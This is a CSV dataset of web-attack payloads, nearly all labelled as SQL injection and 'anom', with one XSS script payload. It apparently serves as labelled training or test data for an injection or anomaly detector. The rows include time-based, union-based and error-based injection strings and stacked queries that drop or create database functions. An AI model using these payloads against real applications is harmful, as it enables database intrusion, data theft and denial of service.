"payload","length","attack_type","label"
"1"" or 6793=(select 6793 from pg_sleep(5)) and ""kojr""=""kojr","58","sqli","anom"
"1'||(select 'xtcb' where 5240=5240;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'","137","sqli","anom"
"1') and elt(1210=1210,sleep(5)) and ('medg'='medg","49","sqli","anom"
"1%"")) and 2006=2006","19","sqli","anom"
"-1152%') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'='","214","sqli","anom"
"1"") where 7165=7165 or 8466=benchmark(5000000,md5(0x694a4745))--","64","sqli","anom"
"1)));select benchmark(5000000,md5(0x714e4153))#","47","sqli","anom"
"1"") where 1300=1300 order by 1#","31","sqli","anom"
"1 union all select null,null,null,null,null--","45","sqli","anom"
"1) where 7159=7159;select count(*) from generate_series(1,5000000)--","68","sqli","anom"
"-4136')) as cczp where 7052=7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#","100","sqli","anom"
"-1051"") where 6586=6586 or 6647=6738#","37","sqli","anom"
"1"") as vcvw where 2445=2445 and 8594=(select 8594 from pg_sleep(5))--","69","sqli","anom"
"1%"")) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","113","sqli","anom"
"-6359"")) or elt(3546=2433,2433) and ((""qxat""=""qxat","50","sqli","anom"
"1'||(select 'flbv' where 7451=7451 and 4595=4595#","49","sqli","anom"
"1) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","110","sqli","anom"
"1') as yhgk where 9246=9246 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--","137","sqli","anom"
"1"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""tgdu""=""tgdu","151","sqli","anom"
"1) where 6950=6950 rlike (select * from (select(sleep(5)))sgvo)--","65","sqli","anom"
"1,(select (case when (3717=3717) then 1 else 3717*(select 3717 from master..sysdatabases) end))","95","sqli","anom"
"-8950"")) as uahs where 2113=2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#","100","sqli","anom"
"1""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((""vfvh""=""vfvh","105","sqli","anom"
"1"") and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""ajuh""=""ajuh","172","sqli","anom"
"1%"")) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","100","sqli","anom"
"1%""))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (((""%""=""","189","sqli","anom"
"-4095') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","138","sqli","anom"
"(select 2527 from pg_sleep(5))","30","sqli","anom"
"-5431""))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""ipmo""=""ipmo","231","sqli","anom"
"1);select * from generate_series(7610,7610,case when (7610=9416) then 1 else 0 end) limit 1--","93","sqli","anom"
"1'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('aqdj'='aqdj","115","sqli","anom"
"1"")) as nhus where 3689=3689;if(4135=2165) select 4135 else drop function otyy--","80","sqli","anom"
"1') where 2120=2120;call regexp_substring(repeat(right(char(3702),0),500000000),null)--","87","sqli","anom"
"(select 2412=('qqpjq'||(select case 2412 when 2412 then 1 else 0 end from rdb$database)||'qzvzq'))","98","sqli","anom"
"1 and elt(1210=1210,sleep(5))","29","sqli","anom"
"1%"")) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","107","sqli","anom"
"1"")) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((""tfso""=""tfso","193","sqli","anom"
"1')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('ozan'='ozan","116","sqli","anom"
"1%""))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","104","sqli","anom"
"(select (case when (6035=9882) then 6035 else 6035*(select 6035 from mysql.db) end))","84","sqli","anom"
"1"") where 5358=5358;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--","107","sqli","anom"
"1%')) union all select null,null,null,null,null,null,null,null,null#","68","sqli","anom"
"1';select pg_sleep(5) and 'rpka'='rpka","38","sqli","anom"
"1%' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and '%'='","109","sqli","anom"
"1%"") and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","145","sqli","anom"
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)","152","sqli","anom"
"1' or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)","172","sqli","anom"
"1' in boolean mode);select (case when (4306=2815) then 4306 else 1/(select 0) end)--","84","sqli","anom"
"1 where 9072=9072 and elt(4249=4249,7259)--","43","sqli","anom"
"1) as rsyw where 4857=4857 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--","183","sqli","anom"
"-4785""))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","140","sqli","anom"
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('ibav'='ibav","176","sqli","anom"
"1' and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'eimq'='eimq","215","sqli","anom"
"1) where 6304=6304;select like('abcdefg',upper(hex(randomblob(500000000/2))))--","79","sqli","anom"
"1"")) as pxdp where 4575=4575 and elt(8258=7218,7218)--","54","sqli","anom"
"1);waitfor delay '0:0:5'","24","sqli","anom"
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('ajkb'='ajkb","118","sqli","anom"
"1"")) union all select null,null,null,null,null,null--","53","sqli","anom"
"1) or 8466=benchmark(5000000,md5(0x694a4745))","45","sqli","anom"
"1"" and 2006=2006","16","sqli","anom"
"-1730' or 8571=8571--","21","sqli","anom"
"-8034"" or 8571=8571--","21","sqli","anom"
"1' in boolean mode);select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","104","sqli","anom"
"1' where 7882=7882 and 6663=4524--","34","sqli","anom"
"1' where 5230=5230;select like('abcdefg',upper(hex(randomblob(500000000/2))))--","79","sqli","anom"
"1""))) and elt(1210=1210,sleep(5)) and (((""ilge"" like ""ilge","58","sqli","anom"
"-4346') or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","138","sqli","anom"
"1"" union all select null,null,null,null,null#","45","sqli","anom"
"1))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","80","sqli","anom"
"1"")));select sleep(5)#","22","sqli","anom"
"1 where 6223=6223 rlike sleep(5)#","33","sqli","anom"
"1%'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('%'='","109","sqli","anom"
"1'+(select 'rejz' where 1530=1530 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+'","239","sqli","anom"
"1')) and elt(3053=9778,9778) and (('yfaa' like 'yfaa","52","sqli","anom"
"-7810 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))-- vuvj","210","sqli","anom"
"1')) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","113","sqli","anom"
"1'+(select 'iyvn' where 9358=9358 or elt(6272=6272,sleep(5)))+'","63","sqli","anom"
"1)) union all select null,null,null,null,null#","46","sqli","anom"
"-4572') union all select 3520--","31","sqli","anom"
"1' where 5004=5004 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","125","sqli","anom"
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2))))--","65","sqli","anom"
"-4407"") where 2055=2055 or elt(9714=5040,5040)--","48","sqli","anom"
"1'+(select 'hhnz' where 2465=2465;select (case when (3537=5218) then 3537 else 3537*(select 3537 from mysql.db) end)#","117","sqli","anom"
"-8544%"" or 6872=6872 and ""%""=""","30","sqli","anom"
"-6457 where 1764=1764 union all select 1764,1764,1764,1764,1764,1764,1764,1764--","80","sqli","anom"
"1))) union all select null,null,null,null,null,null,null--","58","sqli","anom"
"-2300) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))","208","sqli","anom"
"1""));select count(*) from generate_series(1,5000000) and ((""dros""=""dros","71","sqli","anom"
"1') as hwpf where 5603=5603;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","112","sqli","anom"
"1'+(select 'kiqf' where 5920=5920;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--","127","sqli","anom"
"1) as ewnv where 3393=3393 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","179","sqli","anom"
"-5207"" where 2050=2050 union all select 2050,2050,2050,2050,2050,2050,2050--","76","sqli","anom"
"1' in boolean mode) and 5981=6700","33","sqli","anom"
"1"") where 9511=9511 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--","219","sqli","anom"
"-3368')) union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--","72","sqli","anom"
"1'||(select 'tkmc' from dual where 9675=9675 union all select null,null,null,null--","83","sqli","anom"
"-8722%' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'='","197","sqli","anom"
"1') and (select * from (select(sleep(5)))gcrr)#","47","sqli","anom"
"1'));select (case when (5856=7176) then 5856 else cast(1 as int)/(select 0 from dual) end) from dual--","102","sqli","anom"
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'vmuj' like 'vmuj","68","sqli","anom"
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'uwep'='uwep","123","sqli","anom"
"1' in boolean mode) and make_set(7804=3315,3315)#","49","sqli","anom"
"1 where 5828=5828 and (3020=3020)*6703--","40","sqli","anom"
"-8976%""))) union all select 5146,5146,5146,5146,5146,5146,5146,5146--","69","sqli","anom"
"1') and 3560=5467--","19","sqli","anom"
"1"");call regexp_substring(repeat(right(char(3702),0),500000000),null) and (""nwjv""=""nwjv","87","sqli","anom"
"1"";select case when 7717=7717 then 1 else null end--","52","sqli","anom"
"1') as mvai where 5856=5856 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--","132","sqli","anom"
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'rhzy'='rhzy","169","sqli","anom"
"1')) and sleep(5)#","18","sqli","anom"
"1"" and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ""nzgn""=""nzgn","221","sqli","anom"
"1'+(select 'lpkv' where 8760=8760;if(7899=7899) select 7899 else drop function zbbp--","85","sqli","anom"
"-3013') where 2027=2027 union all select 2027,2027,2027,2027--","62","sqli","anom"
"1'||(select 'fjlg' from dual where 9517=9517;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","161","sqli","anom"
"1' or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","140","sqli","anom"
"1'+(select 'toec' where 5810=5810 and sleep(5))+'","49","sqli","anom"
"1) as nwfz where 7365=7365 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--","227","sqli","anom"
"1"") where 9447=9447;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","120","sqli","anom"
"-1711) where 9098=9098 order by 1#","34","sqli","anom"
"1""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((""tbcc""=""tbcc","106","sqli","anom"
"1"") or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","110","sqli","anom"
"1 or sleep(5)#","14","sqli","anom"
"1) as bozx where 2160=2160 and sleep(5)#","40","sqli","anom"
"1'+(select tart where 9861=9861;begin dbms_lock.sleep(5); end--","63","sqli","anom"
"1""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""obau""=""obau","115","sqli","anom"
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)","97","sqli","anom"
"1'||(select 'kyhs' from dual where 9491=9491;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","129","sqli","anom"
"1%') union all select null#","27","sqli","anom"
"1"") as bpmk where 4506=4506;select (case when (3855=3855) then 3855 else 1/(select 0) end)--","92","sqli","anom"
"1"")) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((""lazm"" like ""lazm","124","sqli","anom"
"1'+(select kfmv where 1679=1679;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)+'","116","sqli","anom"
"1%"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--","94","sqli","anom"
"</script><script>alert(1)</script>","34","xss","anom"
"1"" (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ""owzc"" like ""owzc","222","sqli","anom"
"1;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","98","sqli","anom"
"1')) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","102","sqli","anom"
"1"" where 3764=3764;iif(4460=1610,1,1/0)","39","sqli","anom"
"-4152"") where 9781=9781 union all select 9781,9781,9781,9781,9781--","67","sqli","anom"
"1"")));begin dbms_lock.sleep(5); end--","37","sqli","anom"
"1%"") union all select null,null,null,null,null--","48","sqli","anom"
"1"")));select sleep(5) and (((""lczw""=""lczw","41","sqli","anom"
"1'))) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((('sjxp' like 'sjxp","138","sqli","anom"
"-6527')) union all select 5053,5053,5053,5053--","47","sqli","anom"
"1') where 2121=2121 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","114","sqli","anom"
"1' in boolean mode);if(7899=7899) select 7899 else drop function zbbp--","71","sqli","anom"
